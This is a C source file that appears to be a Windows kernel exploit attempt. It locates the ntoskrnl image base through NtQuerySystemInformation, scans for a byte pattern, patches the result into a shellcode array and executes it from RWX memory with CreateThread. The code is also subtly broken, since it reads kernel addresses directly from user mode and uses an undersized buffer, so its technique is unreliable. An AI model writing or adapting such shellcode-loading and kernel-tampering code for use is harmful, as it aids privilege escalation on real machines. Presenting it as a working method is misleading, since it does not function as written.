#include <windows.h>
#include <winternl.h>

typedef NTSYSAPI NTSTATUS(NTAPI* NtQuerySystemInformation_t)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef struct BASE_MODULE_ENTRY {
    ULONG Unknown1;
    ULONG Unknown2;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT NameLength;
    USHORT NameOffset;
} BASE_MODULE_ENTRY, *PBASE_MODULE_ENTRY;

typedef struct SYSTEM_MODULE_INFORMATION {
    ULONG Count;
    BASE_MODULE_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

int main() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    HMODULE hAdvapi32 = LoadLibraryA("advapi32.dll");
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");

    LPVOID LoadLibraryAAddr = GetProcAddress(hKernel32, "LoadLibraryA");
    LPVOID GetProcAddressAddr = GetProcAddress(hKernel32, "GetProcAddress");
    LPVOID RegOpenKeyExAAddr = GetProcAddress(hAdvapi32, "RegOpenKeyExA");
    LPVOID RegQueryValueExAAddr = GetProcAddress(hAdvapi32, "RegQueryValueExA");
    LPVOID RegCloseKeyAddr = GetProcAddress(hAdvapi32, "RegCloseKey");
    NtQuerySystemInformation_t NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtdll, "NtQuerySystemInformation");

    HKEY hKey;
    DWORD dwType, dwSize = sizeof(DWORD);
    DWORD dwData;

    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management", 0, KEY_QUERY_VALUE, &hKey);
    RegQueryValueExA(hKey, "DisablePagingExecutive", NULL, &dwType, (LPBYTE)&dwData, &dwSize);
    RegCloseKey(hKey);

    SYSTEM_MODULE_INFORMATION smi;
    ULONG returnLength;

    NtQuerySystemInformation(11, &smi, sizeof(smi), &returnLength);
    PVOID ntoskrnlBase = smi.Module[0].ImageBase;

    BYTE shellcode[] = {
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x48, 0x8B, 0x10, 
        0x48, 0x05, 0x07, 0x00, 0x00, 0x00, 
        0x48, 0x89, 0x10 
    };

    BYTE pattern[] = { 0x48, 0x8B, 0x0D, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xC1, 0x4C, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00, 0x4D, 0x8B, 0x0D, 0x00, 0x00, 0x00, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x00, 0x00, 0x00, 0x00, 0x48, 0x33, 0xC0, 0xF6, 0xC1, 0x01 };

    for (DWORD i = 0; i < smi.Module[0].ImageSize - sizeof(pattern); i++) {
        if (memcmp((PVOID)((ULONG_PTR)ntoskrnlBase + i), pattern, sizeof(pattern)) == 0) {
            memcpy(&shellcode[2], (PVOID)((ULONG_PTR)ntoskrnlBase + i), sizeof(PVOID));
            break;
        }
    }

    LPVOID shellcodeAddr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(shellcodeAddr, shellcode, sizeof(shellcode));

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellcodeAddr, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    return 0;
}